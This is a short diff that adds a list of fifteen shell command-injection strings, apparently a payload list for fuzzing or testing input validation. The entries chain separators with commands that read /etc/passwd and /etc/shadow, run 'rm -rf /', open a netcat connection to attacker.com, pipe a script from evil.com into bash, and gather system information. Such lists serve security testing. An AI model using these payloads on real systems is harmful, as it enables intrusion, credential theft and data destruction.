@@ -1,0 +1,15 @@
+; ls -la
+| cat /etc/passwd
+&& whoami
+; rm -rf /
+| nc attacker.com 4444
+; curl http://evil.com/shell.sh | bash
+&& wget http://evil.com/malware
+; ping -c 10 attacker.com
+| nslookup attacker.com
+; cat /etc/shadow
+&& id
+| uname -a
+; ps aux
+&& netstat -an
+| ifconfig
